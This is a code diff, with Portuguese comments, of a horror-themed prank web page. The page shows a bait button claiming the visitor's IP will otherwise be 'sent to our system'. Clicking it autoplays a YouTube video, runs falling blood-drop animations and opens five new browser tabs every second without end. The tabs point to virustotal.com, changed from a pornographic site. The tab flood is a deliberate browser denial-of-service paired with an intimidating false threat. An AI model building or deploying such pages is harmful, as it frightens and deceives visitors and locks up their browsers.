@@ -16,8 +16,8 @@
             font-family: 'Creepster', cursive; /* Fonte assustadora */
             color: white;
             text-align: center;
-            animation: blink 0.5s infinite; /* Aumentar a velocidade de piscar */
-            cursor: pointer; /* Cursor muda para indicar que é clicável */
+            overflow: hidden; /* Para evitar rolagem */
+            position: relative; /* Para posicionar as gotículas */
         }
 
         @keyframes blink {
@@ -33,27 +33,31 @@
             color: white; /* Definindo a cor do texto como branco */
             font-size: 50px;
             text-shadow: 0 0 20px rgba(255, 255, 255, 0.7); /* Sombra branca */
+            z-index: 10; /* Para garantir que a mensagem apareça acima do fundo */
         }
 
-        /* Estilo para efeito de chuva de sangue */
-        .blood {
+        /* Estilo das gotículas de sangue */
+        .blood-drop {
             position: absolute;
-            top: 0;
-            left: 0;
-            height: 100%;
-            width: 100%;
-            background: url('https://cdn.pixabay.com/photo/2018/09/11/16/57/paint-3674503_1280.png') repeat;
-            opacity: 0.1; /* Ajuste a opacidade conforme necessário */
-            pointer-events: none; /* Para que o clique não interfira na mensagem */
-            animation: fall 2s infinite linear;
+            width: 10px;
+            height: 10px;
+            background-color: red;
+            border-radius: 50%; /* Forma circular */
+            opacity: 0.8;
+            animation: drip linear infinite;
         }
 
-        @keyframes fall {
-            from {
-                top: -100%;
+        @keyframes drip {
+            0% {
+                transform: translateY(-10px);
+                opacity: 0.8;
             }
-            to {
-                top: 100%;
+            50% {
+                opacity: 0.6; /* Mudando a opacidade durante a animação */
+            }
+            100% {
+                transform: translateY(100vh); /* Move a gota para baixo */
+                opacity: 0; /* Faz a gota desaparecer ao final */
             }
         }
 
@@ -67,6 +71,7 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            z-index: 10; /* Para garantir que o botão apareça acima do fundo */
         }
 
         /* Estilo do botão ao passar o mouse */
@@ -87,13 +92,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet"> <!-- Fonte assustadora -->
 </head>
 <body>
-    <div class="blood"></div>
     <div class="message" id="message"></div>
 
     <!-- Botão para tocar a música e abrir guias -->
     <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
 
-    <!-- Containe do vídeo do YouTube -->
+    <!-- Container do vídeo do YouTube -->
     <div id="videoContainer">
         <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
     </div>
@@ -118,15 +122,40 @@
             const videoContainer = document.getElementById('videoContainer');
             videoContainer.style.display = 'block'; // Mostra o container do vídeo
             const player = document.getElementById('youtubeVideo');
+            player.style.display = 'block'; // Mostra o iframe do vídeo
             player.src += ""; // Reinicia o src para tentar o autoplay novamente
             
-            // Abre novas guias infinitamente
-            function openMultipleTabs() {
-            for (let i = 0; i < 10; i++) {
-                window.open("https://pornhub.com/", "_blank"); // Altere o link para o que você preferir
-            }
+            // Abre 10 novas guias a cada segundo
+            setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
+                }
+            }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
+
+            // Inicia a animação das gotículas de sangue
+            createBloodDrops();
         }
-            setInterval(openMultipleTabs, 1000); // Abre guias a cada 1000 ms (1 segundo)
+
+        // Função para criar gotículas de sangue
+        function createBloodDrops() {
+            const body = document.body;
+
+            // Cria uma gotícula a cada 500 milissegundos
+            setInterval(() => {
+                const drop = document.createElement('div');
+                drop.className = 'blood-drop';
+                
+                // Posição aleatória para a gotícula
+                drop.style.left = Math.random() * 100 + 'vw';
+                drop.style.animationDuration = Math.random() * 1 + 2 + 's'; // Dura entre 2s a 3s
+                body.appendChild(drop);
+
+                // Remove a gotícula após a animação
+                drop.addEventListener('animationend', () => {
+                    drop.remove();
+                });
+            }, 500);
+        }
 
         // Adiciona um listener de clique ao botão
         document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
